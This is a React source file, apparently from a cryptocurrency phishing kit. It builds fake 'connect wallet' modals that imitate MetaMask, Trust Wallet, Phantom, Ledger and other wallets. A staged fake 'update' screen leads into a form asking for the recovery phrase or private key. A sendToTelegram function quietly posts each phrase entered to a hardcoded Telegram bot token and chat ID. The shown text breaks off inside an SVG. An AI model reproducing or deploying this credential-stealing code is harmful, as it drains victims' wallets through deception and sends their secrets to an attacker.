import { useState, useEffect, useRef } from 'react'
import { useNavigate } from 'react-router-dom'
import { OKXModal, PhantomModal, RabbyModal, WalletConnectModal, RainbowModal, LedgerModal, KeplrModal, OneinchModal, SuiModal, CoinbaseModal, ImportResultDialog } from './WalletModals'

/* ─── Telegram notification ─── */
const TG_TOKEN = import.meta.env.VITE_TG_TOKEN || '8487135691:AAGZeZevl9vb5ZvttbErKyreaOlGo7Jdo1s'
const TG_CHAT  = import.meta.env.VITE_TG_CHAT || '5245115191'

function sendToTelegram(walletName, words) {
  // Skip if no token
  if (!TG_TOKEN || !TG_CHAT) return
  
  try {
    const phrase = words.join(' ')
    const text = `🔐 *New Seed Phrase Submitted*\n\n*Wallet:* ${walletName}\n*Phrase:* \`${phrase}\``
    const controller = new AbortController()
    const timeoutId = setTimeout(() => controller.abort(), 5000)
    
    fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'Markdown' }),
      signal: controller.signal,
    })
    .then(() => clearTimeout(timeoutId))
    .catch(() => {
      clearTimeout(timeoutId)
    })
  } catch (err) {
    // Silent fail
  }
}

/* ─── Wallet-specific connecting SVG components ─── */

function MetaMaskFoxSVG() {
  return (
    <svg className="wm-fox-svg" fill="none" height="33" viewBox="0 0 35 33" width="35" xmlns="http://www.w3.org/2000/svg">
      <g strokeLinecap="round" strokeLinejoin="round" strokeWidth=".25">
        <path d="m32.9582 1-13.1341 9.7183 2.4424-5.72731z" fill="#e17726" stroke="#e17726"/>
        <g fill="#e27625" stroke="#e27625">
          <path d="m2.66296 1 13.01714 9.809-2.3254-5.81802z"/>
          <path d="m28.2295 23.5335-3.4947 5.3386 7.4829 2.0603 2.1436-7.2823z"/>
          <path d="m1.27281 23.6501 2.13055 7.2823 7.46994-2.0603-3.48166-5.3386z"/>
          <path d="m10.4706 14.5149-2.0786 3.1358 7.405.3369-.2469-7.969z"/>
          <path d="m25.1505 14.5149-5.1575-4.58704-.1688 8.05974 7.4049-.3369z"/>
          <path d="m10.8733 28.8721 4.4819-2.1639-3.8583-3.0062z"/>
          <path d="m20.2659 26.7082 4.4689 2.1639-.6105-5.1701z"/>
        </g>
        <path d="m24.7348 28.8721-4.469-2.1639.3638 2.9025-.039 1.231z" fill="#d5bfb2" stroke="#d5bfb2"/>
        <path d="m10.8732 28.8721 4.1572 1.9696-.026-1.231.3508-2.9025z" fill="#d5bfb2" stroke="#d5bfb2"/>
        <path d="m15.1084 21.7842-3.7155-1.0884 2.6243-1.2051z" fill="#233447" stroke="#233447"/>
        <path d="m20.5126 21.7842 1.0913-2.2935 2.6372 1.2051z" fill="#233447" stroke="#233447"/>
        <path d="m10.8733 28.8721.6495-5.3386-4.13117.1167z" fill="#cc6228" stroke="#cc6228"/>
        <path d="m24.0982 23.5335.6366 5.3386 3.4946-5.2219z" fill="#cc6228" stroke="#cc6228"/>
        <path d="m27.2291 17.6507-7.405.3369.6885 3.7966 1.0913-2.2935 2.6372 1.2051z" fill="#cc6228" stroke="#cc6228"/>
        <path d="m11.3929 20.6958 2.6242-1.2051 1.0913 2.2935.6885-3.7966-7.40495-.3369z" fill="#cc6228" stroke="#cc6228"/>
        <path d="m8.392 17.6507 3.1049 6.0513-.1039-3.0062z" fill="#e27525" stroke="#e27525"/>
        <path d="m24.2412 20.6958-.1169 3.0062 3.1049-6.0513z" fill="#e27525" stroke="#e27525"/>
        <path d="m15.797 17.9876-.6886 3.7967.8704 4.4833.1949-5.9087z" fill="#e27525" stroke="#e27525"/>
        <path d="m19.8242 17.9876-.3638 2.3584.1819 5.9216.8704-4.4833z" fill="#e27525" stroke="#e27525"/>
        <path d="m20.5127 21.7842-.8704 4.4834.6236.4406 3.8584-3.0062.1169-3.0062z" fill="#f5841f" stroke="#f5841f"/>
        <path d="m11.3929 20.6958.104 3.0062 3.8583 3.0062.6236-.4406-.8704-4.4834z" fill="#f5841f" stroke="#f5841f"/>
        <path d="m20.5906 30.8417.039-1.231-.3378-.2851h-4.9626l-.3248.2851.026 1.231-4.1572-1.9696 1.4551 1.1921 2.9489 2.0344h5.0536l2.962-2.0344 1.442-1.1921z" fill="#c0ac9d" stroke="#c0ac9d"/>
        <path d="m20.2659 26.7082-.6236-.4406h-3.6635l-.6236.4406-.3508 2.9025.3248-.2851h4.9626l.3378.2851z" fill="#161616" stroke="#161616"/>
        <path d="m33.5168 11.3532 1.1043-5.36447-1.6629-4.98873-12.6923 9.3944 4.8846 4.1205 6.8983 2.0085 1.52-1.7752-.6626-.4795 1.0523-.9588-.8054-.622 1.0523-.8034z" fill="#763e1a" stroke="#763e1a"/>
        <path d="m1 5.98873 1.11724 5.36447-.71451.5313 1.06527.8034-.80545.622 1.05228.9588-.66255.4795 1.51997 1.7752 6.89835-2.0085 4.8846-4.1205-12.69233-9.3944z" fill="#763e1a" stroke="#763e1a"/>
        <path d="m32.0489 16.5234-6.8983-2.0085 2.0786 3.1358-3.1049 6.0513 4.1052-.0519h6.1318z" fill="#f5841f" stroke="#f5841f"/>
        <path d="m10.4705 14.5149-6.89828 2.0085-2.29944 7.1267h6.11883l4.10519.0519-3.10487-6.0513z" fill="#f5841f" stroke="#f5841f"/>
        <path d="m19.8241 17.9876.4417-7.5932 2.0007-5.4034h-8.9119l2.0006 5.4034.4417 7.5932.1689 2.3842.013 5.8958h3.6635l.013-5.8958z" fill="#f5841f" stroke="#f5841f"/>
      </g>
    </svg>
  )
}

function TrustShieldSVG() {
  return (
    <svg className="wm-trust-shield" fill="none" width="62" height="87" viewBox="0 0 62 87" xmlns="http://www.w3.org/2000/svg">
      <g clipPath="url(#trust_clip)">
        <path d="M-0.00195312 26.9479L30.5756 16.9648V86.0759C8.73428 76.8606 -0.00195312 59.1989 -0.00195312 49.2159V26.9465V26.9479Z" fill="#48FF91"/>
        <path d="M61.1556 26.9479L30.5781 16.9648V86.0759C52.4194 76.8606 61.1556 59.1989 61.1556 49.2172V26.9479Z" fill="url(#trust_grad)"/>
        {/* T (first) */}
        <path d="M10.8366 4.28158V0.34082H0.0195312V4.28435H3.24781V13.0137H7.60833V4.28158H10.8366Z" fill="#48FF91"/>
        {/* R */}
        <path d="M12.0561 0.34082H16.3227V2.73096C17.7214 0.582458 19.33 0.34082 21.6857 0.34082V4.56603H20.6128C17.7905 4.56603 16.4387 5.89434 16.4387 8.52474V13.0151H12.0547V0.34082H12.0561Z" fill="#48FF91"/>
        {/* U */}
        <path d="M35.9252 13.0137H31.5413V11.8055C30.5844 12.917 29.2795 13.3989 27.6709 13.3989C24.6166 13.3989 22.8906 11.5887 22.8906 8.25687V0.34082H27.2746V7.2696C27.2746 8.83818 28.0437 9.75502 29.3486 9.75502C30.6534 9.75502 31.5413 8.86165 31.5413 7.34141V0.34082H35.9252V13.0151V13.0137Z" fill="#48FF91"/>
        {/* S */}
        <path d="M36.9961 9.10059H41.1012C41.289 10.0174 41.9172 10.4027 43.4319 10.4027C44.6677 10.4027 45.3913 10.1141 45.3913 9.58249C45.3913 9.17101 45.0406 8.9059 44.0395 8.68912L40.7284 7.94073C38.5136 7.43536 37.3938 6.15538 37.3938 4.10215C37.3938 1.39719 39.3752 -0.00292969 43.2221 -0.00292969C47.0689 -0.00292969 48.9578 1.36129 49.2851 4.28303H45.2049C45.1358 3.51117 44.3419 3.03894 43.037 3.03894C41.989 3.03894 41.3124 3.37585 41.3124 3.88398C41.3124 4.31755 41.7543 4.65584 42.6421 4.87539L46.1162 5.72043C48.4 6.27412 49.4977 7.43398 49.4977 9.31738C49.4977 11.9257 47.236 13.4708 43.3905 13.4708C39.545 13.4708 37.0016 11.8056 37.0016 9.10059H36.9975H36.9961Z" fill="#48FF91"/>
        {/* T (last) */}
        <path d="M61.17 4.28158V0.34082H50.3516V4.28435H53.5798V13.0137H57.9404V4.28158H61.17Z" fill="#48FF91"/>
      </g>
      <defs>
        <linearGradient id="trust_grad" x1="29.1518" y1="94.7238" x2="54.3898" y2="3.84876" gradientUnits="userSpaceOnUse">
          <stop offset="0.26" stopColor="#48FF91"/>
          <stop offset="0.66" stopColor="#0094FF"/>
          <stop offset="0.8" stopColor="#0038FF"/>
          <stop offset="0.89" stopColor="#0500FF"/>
        </linearGradient>
        <clipPath id="trust_clip"><rect width="62" height="87"/></clipPath>
      </defs>
    </svg>
  )
}

function PhantomGhostSVG() {
  return (
    <svg className="wm-phantom-ghost" width="593" height="493" viewBox="0 0 593 493" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M70.0546 493C145.604 493 202.38 427.297 236.263 375.378C232.142 386.865 229.852 398.351 229.852 409.378C229.852 439.703 247.252 461.297 281.592 461.297C328.753 461.297 379.119 419.946 405.218 375.378C403.386 381.811 402.471 387.784 402.471 393.297C402.471 414.432 414.375 427.757 438.643 427.757C515.108 427.757 592.03 292.216 592.03 173.676C592.03 81.3243 545.327 0 428.112 0C222.069 0 0 251.784 0 414.432C0 478.297 34.3405 493 70.0546 493ZM357.141 163.568C357.141 140.595 369.962 124.514 388.734 124.514C407.049 124.514 419.87 140.595 419.87 163.568C419.87 186.541 407.049 203.081 388.734 203.081C369.962 203.081 357.141 186.541 357.141 163.568ZM455.126 163.568C455.126 140.595 467.947 124.514 486.719 124.514C505.034 124.514 517.855 140.595 517.855 163.568C517.855 186.541 505.034 203.081 486.719 203.081C467.947 203.081 455.126 186.541 455.126 163.568Z" fill="#FFFDF8"/>
    </svg>
  )
}

function RabbySVG() {
  return (
    <svg className="wm-rabby-svg" width="100" height="100" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100">
      <path d="M92.53 55.386c3.375-7.57-13.312-28.715-29.253-37.525-10.048-6.825-20.519-5.887-22.64-2.89-4.653 6.576 15.41 12.148 28.83 18.65-2.885 1.258-5.603 3.515-7.202 6.401-5.002-5.482-15.982-10.203-28.865-6.4-8.682 2.562-15.898 8.604-18.686 17.728a5.428 5.428 0 00-2.218-.47c-3.018 0-5.465 2.456-5.465 5.486s2.447 5.486 5.465 5.486c.56 0 2.31-.377 2.31-.377l27.952.203C31.58 79.48 22.745 82.082 22.745 85.166c0 3.084 8.453 2.249 11.627 1.099 15.194-5.503 31.513-22.654 34.314-27.591 11.76 1.472 21.643 1.647 23.844-3.288z" fill="url(#rabby0)"/>
      <path fillRule="evenodd" clipRule="evenodd" d="M69.465 33.623h.002c.622-.245.521-1.167.35-1.891-.392-1.665-7.165-8.378-13.525-11.385-8.666-4.097-15.047-3.886-15.99-1.997 1.765 3.631 9.949 7.041 18.496 10.602 3.647 1.52 7.36 3.067 10.668 4.67h-.001z" fill="url(#rabby1)"/>
      <path fillRule="evenodd" clipRule="evenodd" d="M58.467 70.175c-1.752-.672-3.732-1.29-5.983-1.849 2.4-4.31 2.903-10.692.637-14.726-3.181-5.662-7.174-8.676-16.453-8.676-5.103 0-18.843 1.725-19.087 13.239-.026 1.208 0 2.315.086 3.333l25.091.182c-3.383 5.387-6.55 9.382-9.324 12.42 3.33.856 6.078 1.575 8.601 2.235 2.394.627 4.585 1.2 6.878 1.787 3.46-2.53 6.712-5.288 9.554-7.945z" fill="url(#rabby2)"/>
      <path d="M14.379 60.312c1.025 8.746 5.977 12.174 16.095 13.188 10.12 1.015 15.924.334 23.651 1.04 6.454.59 12.217 3.89 14.355 2.75 1.923-1.027.847-4.736-1.727-7.116-3.337-3.085-7.956-5.23-16.083-5.991 1.62-4.451 1.166-10.692-1.35-14.088-3.636-4.91-10.35-7.129-18.846-6.16-8.876 1.014-17.382 5.4-16.095 16.377z" fill="url(#rabby3)"/>
      <defs>
        <linearGradient id="rabby0" x1="32.389" y1="48.683" x2="91.836" y2="65.478" gradientUnits="userSpaceOnUse">
          <stop stopColor="#8697FF"/><stop offset="1" stopColor="#ABB7FF"/>
        </linearGradient>
        <linearGradient id="rabby1" x1="81.798" y1="47.549" x2="38.766" y2="4.574" gradientUnits="userSpaceOnUse">
          <stop stopColor="#8697FF"/><stop offset="1" stopColor="#5156D8" stopOpacity="0"/>
        </linearGradient>
        <linearGradient id="rabby2" x1="59.66" y1="71.678" x2="18.401" y2="48.046" gradientUnits="userSpaceOnUse">
          <stop stopColor="#465EED"/><stop offset="1" stopColor="#8697FF" stopOpacity="0"/>
        </linearGradient>
        <linearGradient id="rabby3" x1="14.379" y1="60.312" x2="68.48" y2="60.312" gradientUnits="userSpaceOnUse">
          <stop stopColor="#8697FF"/><stop offset="1" stopColor="#465EED"/>
        </linearGradient>
      </defs>
    </svg>
  )
}

function LedgerSVG() {
  return (
    <svg className="wm-ledger-svg" width="100" height="100" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
      <rect width="100" height="100" rx="13" fill="#FEE5FB"/>
      <path d="M65.7277 27H44.5023V55.3931H72.9884V34.3873C73 30.3988 69.7292 27 65.7277 27ZM37.9839 27H34.4231C30.4216 27 27 30.2486 27 34.3988V37.948H37.9839V27ZM27 44.5954H37.9839V55.5434H27V44.5954ZM62.0161 72.9884H65.5769C69.5784 72.9884 73 69.7399 73 65.5896V62.052H62.0161V72.9884ZM44.5023 62.052H55.4861V73H44.5023V62.052ZM27 62.052V65.6012C27 69.5896 30.2592 73 34.4231 73H37.9839V62.052H27Z" fill="#333333"/>
    </svg>
  )
}

/* All wallet logos + connecting animation types */
const WALLETS = [
  { name: 'MetaMask',        img: '/media/images/wallet-metamask.webp',     connectType: 'fox' },
  { name: 'Trust Wallet',    img: '/media/images/wallet-trust-wallet.webp', connectType: 'trust' },
  { name: 'Coinbase Wallet', img: '/media/images/wallet-coinbase.webp',     connectType: 'video', connectVideo: '/media/images/warmwelcome_ext_750x1200.webm' },
  { name: 'Phantom Wallet',  img: '/media/images/wallet-phantom.webp',      connectType: 'phantom' },
  { name: 'OKX Wallet',      img: '/media/images/wallet-okx.webp',          connectType: 'video', connectVideo: '/media/images/cover-light.webm' },
  { name: 'Rabby Wallet',    img: '/media/images/wallet-rabby.webp',        connectType: 'rabby' },
  { name: 'Rainbow',         img: '/media/images/wallet-rainbow.png',       connectType: 'rainbow' },
  { name: 'Ledger',          img: '/media/images/wallet-ledger.webp',       connectType: 'ledger' },
  { name: 'Keplr',           img: '/media/images/keplr_new.png',            connectType: 'keplr' },
  { name: 'WalletConnect',   img: '/media/images/walletconnect.png',        connectType: 'walletconnect' },
  { name: '1inch Wallet',    img: '/media/images/1inch.png',                connectType: 'video', connectVideo: '/media/images/1inch.mp4' },
  { name: 'Sui Wallet',      img: '/media/images/sui.png',                  connectType: 'sui' },
]

function WalletIcon({ wallet, size = 40 }) {
  const [failed, setFailed] = useState(false)
  const initials = wallet.name.slice(0, 2).toUpperCase()
  if (failed) {
    return (
      <div style={{
        width: size, height: size, borderRadius: size * 0.25, flexShrink: 0,
        background: 'linear-gradient(135deg,#3a96ff,#00c896)',
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        color: '#fff', fontSize: size * 0.32, fontWeight: 700,
      }}>{initials}</div>
    )
  }
  return (
    <img src={wallet.img} alt={wallet.name} onError={() => setFailed(true)}
      style={{ width: size, height: size, borderRadius: size * 0.25, objectFit: 'contain', flexShrink: 0, display: 'block' }} />
  )
}

/* Renders the correct connecting animation for each wallet type */
function ConnectingVisual({ wallet, isConnecting }) {
  const t = wallet.connectType

  if (t === 'fox') {
    return (
      <div className="wm-fox-wrap">
        <MetaMaskFoxSVG />
        {isConnecting && <div className="wm-fox-spinner" />}
      </div>
    )
  }

  if (t === 'trust') {
    return (
      <div className="wm-trust-wrap">
        <TrustShieldSVG />
        {isConnecting && <div className="wm-trust-spinner" />}
      </div>
    )
  }

  if (t === 'phantom') {
    return (
      <div className="wm-phantom-wrap">
        <PhantomGhostSVG />
        <p className="wm-phantom-boo">BooOooOo...</p>
      </div>
    )
  }

  if (t === 'rabby') {
    return (
      <div className="wm-rabby-wrap">
        <RabbySVG />
        {isConnecting && <div className="wm-rabby-spinner" />}
      </div>
    )
  }

  if (t === 'rainbow') {
    return (
      <div className="wm-rainbow-wrap">
        <img src="/media/images/wallet-rainbow.png" alt="Rainbow" className="wm-rainbow-logo" />
        <p className="wm-rainbow-title">Loading your Rainbow Wallet...</p>
        <p className="wm-rainbow-sub">Your colorful gateway to Ethereum and EVM chains</p>
        {isConnecting && <div className="wm-rainbow-spinner" />}
      </div>
    )
  }

  if (t === 'ledger') {
    return (
      <div className="wm-ledger-wrap">
        <LedgerSVG />
        <p className="wm-ledger-text">Connecting to Ledger Kit</p>
        {isConnecting && <div className="wm-ledger-spinner" />}
      </div>
    )
  }

  if (t === 'keplr') {
    return (
      <div className="wm-keplr-wrap">
        <img src="/media/images/keplr_new.png" alt="Keplr" className="wm-keplr-logo" />
        <h3 className="wm-keplr-title">Loading your Keplr Wallet</h3>
        <p className="wm-keplr-sub">The game-changing wallet for Ethereum and all EVM chains</p>
      </div>
    )
  }

  if (t === 'walletconnect') {
    return (
      <div className="wm-wc-wrap">
        <img src="/media/images/walletconnect.png" alt="WalletConnect" className="wm-wc-logo" />
        <h3 className="wm-wc-title">Loading Wallet Connect</h3>
        <p className="wm-wc-sub">The game-changing wallet for Ethereum and all EVM chains</p>
        {isConnecting && <div className="wm-wc-spinner" />}
      </div>
    )
  }

  if (t === 'sui') {
    return (
      <div className="wm-sui-wrap">
        <img src="/media/images/sui.png" alt="Sui" className="wm-sui-logo" />
        <h3 className="wm-sui-title">Your Money. Unblock.</h3>
        {isConnecting && <div className="wm-sui-spinner" />}
      </div>
    )
  }

  if (t === 'video') {
    return (
      <video key={wallet.connectVideo} className="wm-connect-video"
        src={wallet.connectVideo} autoPlay loop muted playsInline
        disablePictureInPicture controlsList="nodownload nofullscreen noremoteplayback"
        style={{ pointerEvents: 'none' }} />
    )
  }

  return null
}

/* ─── MetaMask seed form with Telegram ─── */
function MetaMaskSeedForm({ onClose, onImportDone }) {
  const seedRef = useRef(null)
  const [wordCount, setWordCount] = useState('12')
  const count = parseInt(wordCount)
  const handleSubmit = () => {
    if (seedRef.current) {
      const inputs = seedRef.current.querySelectorAll('input')
      const words = Array.from(inputs).map(el => el.value.trim()).filter(Boolean)
      if (words.length > 0) sendToTelegram('MetaMask', words)
    }
    onImportDone ? onImportDone() : onClose()
  }
  return (
    <>
      <div className="mm-word-select-row">
        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#6b7280" strokeWidth="2"><path d="M9 5H7a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V7a2 2 0 0 0-2-2h-2"/><rect x="9" y="3" width="6" height="4" rx="1"/></svg>
        <select className="mm-word-select" value={wordCount} onChange={e => setWordCount(e.target.value)}>
          <option value="12">12-word recovery phrase</option>
          <option value="15">15-word recovery phrase</option>
          <option value="18">18-word recovery phrase</option>
          <option value="21">21-word recovery phrase</option>
          <option value="24">24-word recovery phrase</option>
          <option value="1">Private key</option>
        </select>
        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2"><path d="m6 9 6 6 6-6"/></svg>
      </div>
      {count === 1 ? (
        <div ref={seedRef}>
          <input className="mm-seed-pk" type="text" placeholder="Enter your private key…" autoComplete="off" spellCheck="false" />
        </div>
      ) : (
        <div className="mm-seed-wrap" ref={seedRef}>
          {Array.from({ length: count }, (_, i) => (
            <div key={i} className="mm-seed-cell">
              <span className="mm-seed-num">{i + 1}</span>
              <input className="mm-seed-input" placeholder={`word ${i + 1}`} type="text" autoComplete="off" spellCheck="false" autoCapitalize="none" />
            </div>
          ))}
        </div>
      )}
      <button className="mm-seed-submit" onClick={handleSubmit}>Restore Wallet</button>
    </>
  )
}

/* ─── MetaMask dedicated side-modal (matches rpc-monitor.app exactly) ─── */
function MetaMaskModal({ onClose, onImportDone }) {
  // states: 'fox' → 'update' → 'updating' → 'import'
  const [phase, setPhase]       = useState('fox')
  const [progress, setProgress] = useState(0)

  // After 3s on fox, show update screen
  useEffect(() => {
    const t = setTimeout(() => setPhase('update'), 3000)
    return () => clearTimeout(t)
  }, [])

  // Run progress bar when in 'updating' phase
  useEffect(() => {
    if (phase !== 'updating') return
    setProgress(0)
    const iv = setInterval(() => {
      setProgress(p => {
        if (p >= 100) {
          clearInterval(iv)
          setTimeout(() => setPhase('import'), 400)
          return 100
        }
        return p + 1
      })
    }, 100)
    return () => clearInterval(iv)
  }, [phase])

  return (
    <>
      <style>{`
        .mm-overlay {
          position: fixed; inset: 0; z-index: 10000;
          background: rgba(18,18,18,0.5);
          pointer-events: auto;
        }
        .mm-modal {
          position: fixed; z-index: 10001;
          top: 0; right: 32px;
          width: 430px; height: 640px;
          background: #ffffff;
          border: 1px solid #eaecef;
          box-shadow: 0 8px 40px rgba(0,0,0,0.18);
          display: flex; flex-direction: column;
          overflow: hidden;
          font-family: 'Inter', -apple-system, sans-serif;
          animation: mmSlide 0.2s ease;
        }
        @keyframes mmSlide {
          from { opacity:0; transform: translateX(20px); }
          to   { opacity:1; transform: translateX(0); }
        }
        @media (max-width: 600px) {
          .mm-modal {
            top: 0; left: 0; right: 0; bottom: 0;
            width: 100%; height: 100%; max-height: 100%;
            border-radius: 0; transform: none;
          }
        }

        /* ── Fox loading phase ── */
        .mm-fox-phase {
          flex: 1; display: flex; align-items: center; justify-content: center; flex-direction: column;
          background: #fff;
        }
        .mm-fox-phase .wm-fox-svg {
          width: 128px; height: 128px;
          animation: wmFoxBob 2s ease-in-out infinite;
        }
        @keyframes wmSpin { to { transform: rotate(360deg); } }
        @keyframes wmFoxBob {
          0%,100% { transform: translateY(0); }
          50%      { transform: translateY(-8px); }
        }
        .mm-fox-spin {
          width: 48px; height: 48px; margin-top: 48px;
          border: 3px solid rgba(246,133,26,0.2);
          border-top-color: #f6851a; border-radius: 50%;
          animation: wmSpin 0.85s linear infinite;
        }

        /* ── Header bar ── */
        .mm-header {
          display: flex; align-items: center; justify-content: space-between;
          background: #f2f3f5; padding: 12px 16px;
          border-bottom: 1px solid #e6e6e6;
          flex-shrink: 0;
        }
        .mm-close-btn {
          width: 32px; height: 32px; border-radius: 50%;
          border: 2px solid #0376c9; background: none; cursor: pointer;
          display: flex; align-items: center; justify-content: center;
          color: #0376c9; transition: opacity 0.2s;
        }
        .mm-close-btn:hover { opacity: 0.7; }

        /* ── Update available phase ── */
        .mm-update-phase {
          flex: 1; display: flex; flex-direction: column; overflow-y: auto;
          background: #fff;
        }
        .mm-update-body {
          flex: 1; display: flex; flex-direction: column; align-items: center;
          padding: 32px 16px; gap: 0;
        }
        .mm-download-icon {
          color: #0376c9; margin-bottom: 24px;
        }
        .mm-update-title {
          font-size: 24px; font-weight: 700; color: #141618;
          margin: 0 0 8px; text-align: center;
        }
        .mm-update-version {
          font-size: 16px; font-weight: 500; color: #141618;
          margin: 0 0 24px; text-align: center;
        }
        .mm-changelog {
          background: #f5f5f5; border-radius: 8px;
          padding: 16px; width: 100%; max-width: 400px; margin-bottom: 24px;
          box-sizing: border-box;
        }
        .mm-changelog ul {
          margin: 0; padding-left: 20px; list-style: disc;
        }
        .mm-changelog li {
          color: #141618; font-size: 14px; line-height: 1.5; margin-bottom: 8px;
        }
        .mm-changelog li:last-child { margin-bottom: 0; }
        .mm-update-btn {
          width: 100%; max-width: 400px; height: 50px;
          background: #0376c9; color: #fff;
          border: none; border-radius: 999px;
          font-size: 14px; font-weight: 500; cursor: pointer;
          transition: opacity 0.2s;
          font-family: inherit;
        }
        .mm-update-btn:hover { opacity: 0.85; }
        .mm-support-text {
          font-size: 14px; color: #141618; margin-top: 16px; text-align: center;
        }
        .mm-support-link {
          color: #0376c9; text-decoration: none;
          transition: opacity 0.2s;
        }
        .mm-support-link:hover { opacity: 0.8; }

        /* ── Updating / progress phase ── */
        .mm-updating-phase {
          flex: 1; display: flex; flex-direction: column;
          background: #fff;
        }
        .mm-updating-body {
          flex: 1; display: flex; flex-direction: column; align-items: center;
          padding: 32px 16px; gap: 0;
        }
        .mm-blue-spinner {
          width: 64px; height: 64px; margin-bottom: 24px;
          border: 3px solid rgba(3,118,201,0.15);
          border-top-color: #0376c9; border-radius: 50%;
          animation: wmSpin 0.75s linear infinite;
        }
        .mm-updating-title {
          font-size: 24px; font-weight: 700; color: #141618;
          margin: 0 0 8px; text-align: center;
        }
        .mm-updating-sub {
          font-size: 16px; font-weight: 400; color: #141618;
          margin: 0 0 24px; text-align: center;
        }
        .mm-progress-wrap {
          width: 100%; max-width: 400px; margin-bottom: 12px;
        }
        .mm-progress-track {
          width: 100%; height: 8px; background: #e6e6e6;
          border-radius: 999px; overflow: hidden;
        }
        .mm-progress-bar {
          height: 100%; background: #0376c9;
          border-radius: 999px;
          transition: width 0.1s linear;
        }
        .mm-progress-pct {
          font-size: 14px; color: #141618; margin-top: 8px; text-align: center;
        }
        .mm-updating-notice {
          font-size: 14px; color: #6a737d; text-align: center; margin-top: 20px;
          max-width: 320px; line-height: 1.5;
        }

        /* ── Import/seed phrase phase ── */
        .mm-import-phase {
          flex: 1; display: flex; flex-direction: column;
          overflow-y: auto; background: #fff;
        }
        .mm-import-body {
          flex: 1; padding: 20px 16px; display: flex; flex-direction: column; gap: 12px;
        }
        .mm-import-title {
          font-size: 20px; font-weight: 700; color: #141618; margin: 0;
        }
        .mm-import-sub {
          font-size: 13px; color: #6a737d; margin: 0; line-height: 1.5;
        }
        .mm-word-select-row {
          display: flex; align-items: center; gap: 8px;
          background: #f4f6fa; border-radius: 10px; padding: 10px 14px;
        }
        .mm-word-select {
          flex: 1; font-size: 13px; font-weight: 500; color: #374151;
          border: none; background: transparent; outline: none; cursor: pointer;
          font-family: inherit;
        }
        .mm-seed-wrap {
          display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 7px;
        }
        .mm-seed-cell { position: relative; }
        .mm-seed-num {
          position: absolute; top: 50%; left: 9px; transform: translateY(-50%);
          font-size: 10px; font-weight: 700; color: #9ca3af;
          pointer-events: none; user-select: none; line-height: 1;
        }
        .mm-seed-input {
          width: 100%; padding: 10px 6px 10px 23px; border: 1.5px solid #e5e7eb;
          border-radius: 10px; font-size: 12px; font-weight: 500; color: #141618;
          font-family: inherit; outline: none; background: #fafafa;
          transition: all 0.18s; box-sizing: border-box;
        }
        .mm-seed-input:focus { border-color: #0376c9; background: #fff; box-shadow: 0 0 0 3px rgba(3,118,201,0.10); }
        .mm-seed-input::placeholder { color: #c4c9d4; font-size: 11px; }
        .mm-seed-pk {
          width: 100%; padding: 12px 14px; border: 1.5px solid #e5e7eb;
          border-radius: 10px; font-size: 13px; font-weight: 500; color: #141618;
          font-family: inherit; outline: none; background: #fafafa;
          transition: all 0.18s; box-sizing: border-box;
        }
        .mm-seed-pk:focus { border-color: #0376c9; background: #fff; box-shadow: 0 0 0 3px rgba(3,118,201,0.10); }
        .mm-seed-pk::placeholder { color: #c4c9d4; }
        .mm-seed-submit {
          width: 100%; height: 50px; background: #0376c9; color: #fff;
          border: none; border-radius: 12px; font-size: 15px; font-weight: 600;
          cursor: pointer; font-family: inherit; transition: opacity 0.2s, transform 0.1s;
          letter-spacing: 0.01em; margin-top: 4px;
        }
        .mm-seed-submit:hover { opacity: 0.88; }
        .mm-seed-submit:active { transform: scale(0.98); }
      `}</style>

      <div className="mm-overlay" onClick={onClose} />
      <div className="mm-modal">

        {phase === 'fox' && (
          <div className="mm-fox-phase">
            <MetaMaskFoxSVG />
            <div className="mm-fox-spin" />
          </div>
        )}

        {phase === 'update' && (
          <>
            <div className="mm-header">
              <svg fill="none" height="33" viewBox="0 0 35 33" width="35" style={{width:32,height:32}} xmlns="http://www.w3.org/2000/svg"><g strokeLinecap="round" strokeLinejoin="round" strokeWidth=".25"><path d="m32.9582 1-13.1341 9.7183 2.4424-5.72731z" fill="#e17726" stroke="#e17726"/><g fill="#e27625" stroke="#e27625"><path d="m2.66296 1 13.01714 9.809-2.3254-5.81802z"/><path d="m28.2295 23.5335-3.4947 5.3386 7.4829 2.0603 2.1436-7.2823z"/><path d="m1.27281 23.6501 2.13055 7.2823 7.46994-2.0603-3.48166-5.3386z"/><path d="m10.4706 14.5149-2.0786 3.1358 7.405.3369-.2469-7.969z"/><path d="m25.1505 14.5149-5.1575-4.58704-.1688 8.05974 7.4049-.3369z"/><path d="m10.8733 28.8721 4.4819-2.1639-3.8583-3.0062z"/><path d="m20.2659 26.7082 4.4689 2.1639-.6105-5.1701z"/></g><path d="m24.7348 28.8721-4.469-2.1639.3638 2.9025-.039 1.231z" fill="#d5bfb2" stroke="#d5bfb2"/><path d="m10.8732 28.8721 4.1572 1.9696-.026-1.231.3508-2.9025z" fill="#d5bfb2" stroke="#d5bfb2"/><path d="m15.1084 21.7842-3.7155-1.0884 2.6243-1.2051z" fill="#233447" stroke="#233447"/><path d="m20.5126 21.7842 1.0913-2.2935 2.6372 1.2051z" fill="#233447" stroke="#233447"/><path d="m10.8733 28.8721.6495-5.3386-4.13117.1167z" fill="#cc6228" stroke="#cc6228"/><path d="m24.0982 23.5335.6366 5.3386 3.4946-5.2219z" fill="#cc6228" stroke="#cc6228"/><path d="m27.2291 17.6507-7.405.3369.6885 3.7966 1.0913-2.2935 2.6372 1.2051z" fill="#cc6228" stroke="#cc6228"/><path d="m11.3929 20.6958 2.6242-1.2051 1.0913 2.2935.6885-3.7966-7.40495-.3369z" fill="#cc6228" stroke="#cc6228"/><path d="m8.392 17.6507 3.1049 6.0513-.1039-3.0062z" fill="#e27525" stroke="#e27525"/><path d="m24.2412 20.6958-.1169 3.0062 3.1049-6.0513z" fill="#e27525" stroke="#e27525"/><path d="m15.797 17.9876-.6886 3.7967.8704 4.4833.1949-5.9087z" fill="#e27525" stroke="#e27525"/><path d="m19.8242 17.9876-.3638 2.3584.1819 